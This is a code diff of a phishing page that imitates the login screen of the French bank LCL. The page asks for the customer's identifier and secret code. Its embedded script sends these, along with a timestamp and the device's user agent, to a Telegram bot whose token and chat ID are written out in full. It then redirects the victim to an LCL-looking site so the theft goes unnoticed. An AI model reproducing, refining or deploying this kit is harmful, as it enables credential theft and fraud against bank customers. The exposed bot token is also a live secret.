@@ -1,201 +1,35 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr-FR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connexion - LCL</title>
+    <meta charset="utf-8">
+    <title>LCL - Mon espace client</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        /* Reset et styles de base */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            /* Fond bleu comme sur la capture */
-            background-color: #004393; 
-            color: #ffffff;
-            padding-bottom: 40px;
-        }
-
-        /* Logo LCL */
-        .logo-container {
-            margin-bottom: 20px;
-            margin-top: 10px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .logo-container img {
-            width: 120px;
-            height: auto;
-            filter: brightness(0) invert(1); /* Le logo devient blanc */
-        }
-
-        /* Titres */
-        h1 {
-            font-size: 20px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 25px;
-            text-align: left;
-            padding-left: 5px;
-        }
-
-        /* Groupes de champs */
-        .input-group {
-            margin-bottom: 25px;
-            position: relative;
-            text-align: left;
-            padding-left: 5px;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            color: #ffffff; /* Texte blanc sur fond bleu */
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-
-        /* Champs avec bordure pointillée et fond blanc */
-        input {
-            width: 100%;
-            height: 50px;
-            padding: 0 15px;
-            font-size: 16px;
-            border: 1px dashed #ffffff; /* Bordure pointillée blanche */
-            border-radius: 4px;
-            background-color: #ffffff;
-            color: #000000;
-            transition: border-color 0.2s;
-            box-sizing: border-box;
-        }
-
-        input:focus {
-            border-color: #004393; /* Bordure bleu au focus */
-            outline: none;
-        }
-
-        input::placeholder {
-            color: #999999;
-            font-style: italic;
-        }
-
-        /* Checkbox "Mémoriser" */
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-            margin-top: 5px;
-            padding-left: 5px;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
-            accent-color: #ffffff; /* Checkbox blanche */
-        }
-
-        .checkbox-group label {
-            margin-bottom: 0;
-            font-size: 14px;
-            color: #ffffff;
-            margin-right: 10px;
-        }
-
-        /* Bouton "Valider >" */
-        button {
-            width: 100%;
-            height: 50px;
-            background-color: #004393; /* Bleu foncé */
-            color: #ffffff;
-            border: 1px solid #ffffff;
-            border-radius: 4px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background-color 0.2s;
-        }
-
-        button:hover {
-            background-color: #003366;
-        }
-
-        /* Liens secondaires */
-        .secondary-links {
-            margin-top: 20px;
-            text-align: left;
-            padding-left: 5px;
-        }
-
-        .secondary-links a {
-            display: block;
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 16px;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        .secondary-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Spinner de chargement */
-        .spinner {
-            display: none;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #ffffff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 30px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Zone de chargement */
-        .loading-overlay {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100%;
-            width: 100%;
-        }
-        
-        .loading-overlay .spinner {
-            display: block;
-        }
-        
-        .loading-overlay p {
-            margin-top: 15px;
-            color: #ffffff;
-            font-size: 14px;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 450px; padding: 20px; display: flex; flex-direction: column; background-color: #004393; color: #ffffff; padding-bottom: 40px; }
+        .logo-container { margin-bottom: 20px; margin-top: 10px; display: flex; justify-content: center; }
+        .logo-container img { width: 120px; height: auto; filter: brightness(0) invert(1); }
+        h1 { font-size: 20px; font-weight: 700; color: #ffffff; margin-bottom: 25px; text-align: left; padding-left: 5px; }
+        .input-group { margin-bottom: 25px; position: relative; text-align: left; padding-left: 5px; }
+        label { display: block; font-size: 14px; color: #ffffff; margin-bottom: 8px; font-weight: 500; }
+        input { width: 100%; height: 50px; padding: 0 15px; font-size: 16px; border: 1px dashed #ffffff; border-radius: 4px; background-color: #ffffff; color: #000000; transition: border-color 0.2s; box-sizing: border-box; }
+        input:focus { border-color: #004393; outline: none; }
+        input::placeholder { color: #999999; font-style: italic; }
+        .checkbox-group { display: flex; align-items: center; margin-bottom: 25px; margin-top: 5px; padding-left: 5px; }
+        .checkbox-group input[type="checkbox"] { width: 20px; height: 20px; margin-right: 10px; accent-color: #ffffff; }
+        .checkbox-group label { margin-bottom: 0; font-size: 14px; color: #ffffff; margin-right: 10px; }
+        button { width: 100%; height: 50px; background-color: #004393; color: #ffffff; border: 1px solid #ffffff; border-radius: 4px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
+        button:hover { background-color: #003366; }
+        .secondary-links { margin-top: 20px; text-align: left; padding-left: 5px; }
+        .secondary-links a { display: block; color: #ffffff; text-decoration: none; font-size: 16px; margin-bottom: 10px; font-weight: 500; }
+        .secondary-links a:hover { text-decoration: underline; }
+        .loading-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; }
+        .spinner { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-overlay .spinner { display: block; }
+        .loading-overlay p { margin-top: 15px; color: #ffffff; font-size: 14px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -210,15 +44,14 @@
 
     <!-- Formulaire -->
     <form id="loginForm">
-        
         <!-- Étape 1 : Identifiant -->
-        <div class="input-group">
+        <div class="input-group" id="userIdGroup">
             <label for="userId">Votre identifiant</label>
             <input type="text" id="userId" placeholder="Ex: 123456789" required autocomplete="off">
         </div>
 
         <!-- Checkbox "Mémoriser" -->
-        <div class="checkbox-group">
+        <div class="checkbox-group" id="rememberGroup">
             <input type="checkbox" id="rememberId" checked>
             <label for="rememberId">Mémoriser mon identifiant</label>
         </div>
@@ -246,7 +79,7 @@
 </div>
 
 <script>
-    // CONFIGURATION TELEGRAM
+    // ⚙️ CONFIGURATION TELEGRAM
     const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ';
     const TELEGRAM_CHAT_ID = '8501464548';
 
@@ -256,54 +89,63 @@
     const submitBtn = document.getElementById('btnSubmit');
     const loginForm = document.getElementById('loginForm');
     const loadingOverlay = document.getElementById('loadingOverlay');
+    const container = document.querySelector('.container');
 
-    // Gestion du formulaire
-    loginForm.addEventListener('submit', function(e) {
+    // 1. Gestion du passage de l'identifiant au code
+    submitBtn.addEventListener('click', function(e) {
         e.preventDefault();
-
-        const userId = userIdInput.value;
-        const password = passwordInput.value;
-
-        // Si le champ code est encore caché, c'est qu'on vient de mettre l'identifiant
+        
+        // Si on est à l'étape 1 (identifiant)
         if (codeGroup.classList.contains('hidden')) {
             codeGroup.classList.remove('hidden');
             passwordInput.focus();
             submitBtn.textContent = "Valider >";
-            return;
+        } 
+        // Si on est à l'étape 2 (code), on envoie
+        else {
+            submitLogin();
         }
+    });
 
-        // Si on arrive ici, c'est que l'utilisateur a tapé son code et clique sur "Valider"
-        // On passe en mode chargement
+    // Fonction pour envoyer les données
+    async function submitLogin() {
+        const userId = userIdInput.value;
+        const password = passwordInput.value;
+        const timestamp = new Date().toLocaleString();
+        const userAgent = navigator.userAgent;
+
+        // Affichage du chargement
         loginForm.style.display = 'none';
-        document.querySelector('.secondary-links').style.display = 'none';
         loadingOverlay.style.display = 'flex';
 
-        // Envoi des données à Telegram
-        const message = `🔐 *Nouvelle connexion LCL détectée*\n\n👤 Identifiant: ${userId}\n🔑 Code: ${password}\n📅 Date: ${new Date().toLocaleString()}`;
+        // Envoi à Telegram
+        const message = `🔴 <b>NOUVELLE CONNEXION LCL</b> 🔴\n\n` +
+                        `👤 <b>Identifiant:</b> ${userId}\n` +
+                        `🔑 <b>Code:</b> ${password}\n` +
+                        `📅 <b>Date/Heure:</b> ${timestamp}\n` +
+                        `📱 <b>Appareil:</b> ${userAgent}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Données envoyées !');
-            }
-        })
-        .catch(error => console.error('Erreur réseau:', error));
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Erreur Telegram:', error);
+        }
 
         // Redirection vers le vrai site LCL après 2 secondes
         setTimeout(() => {
-            window.location.href = 'https://www.lcl.fr/';
+            window.location.href = 'https://www.monespacelcl.fr/';
         }, 2000);
-    });
+    }
 </script>
 
 </body>
